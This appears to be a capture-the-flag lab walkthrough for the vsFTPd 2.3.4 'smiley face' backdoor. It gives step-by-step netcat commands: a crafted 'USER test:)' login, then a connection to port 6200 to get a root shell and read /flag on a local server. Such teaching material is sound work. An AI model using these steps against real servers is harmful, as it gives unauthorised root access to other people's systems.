    In this challenge, you will exploit a vulnerability in version 2.3.4 of vsFTPd, otherwise known as the
    'smiley face' vulnerability. This security flaw allows an attacker to gain unauthorized root access to a system 
    simply by manipulating the username field during FTP login. FTP is a way to transfer files between computers 
    over the internet, like moving documents between your computer and a website.

    - Step 1: Connect to the FTP Server

    The FTP server should now be active - it is listening on TCP port 21, which is the standard port for FTP.

    You can use the 'nc' (netcat) command to connect to the FTP server. Netcat is a command-line tool used to send and 
    receive data over a network, often for testing connections, transferring files, or opening backdoor shells. Run: 

        nc 127.0.0.1 21

    If the connection is successful, the server should respond with a greeting message - "220 (vsFTPd 2.3.4)".
    Note that you will not have a prompt in this connection, but you can still interact with the remote terminal.

    - Step 2: Exploit the vulnerability 

    You will now log in using a specially crafted username that triggers the backdoor. In your nc connection, type:

        USER test:)

    and press Enter. Notice the ':)' at the end of 'test' —this is what activates the malicious backdoor.
    When prompted for a password, enter `PASS <anything>` (it doesn’t matter). Example:

        PASS test

    Note that nothing will change on your current screen, even if this command was successful.

    - Step 3: Open a root shell

    If the exploit worked, the server will open a new backdoor shell on port 6200. Leave your current nc connection open, 
    and in a new terminal, run:

        nc 127.0.0.1 6200

    This should connect you to a root shell on the server, giving you full administrative control over the system.
    Note that you will again not have a prompt, but you will be able to run commands like normal.

    - Step 4: Verify root access

    Once inside the root shell, type:

        whoami

    If the exploit was successful, this command should return:

        root

    This confirms that you now have root privileges, meaning you can run any command on the system.

    - Step 5: Capture the flag!

    In the root shell, read the flag file by running:

        cat /flag

    This will display the flag, completing your challenge!
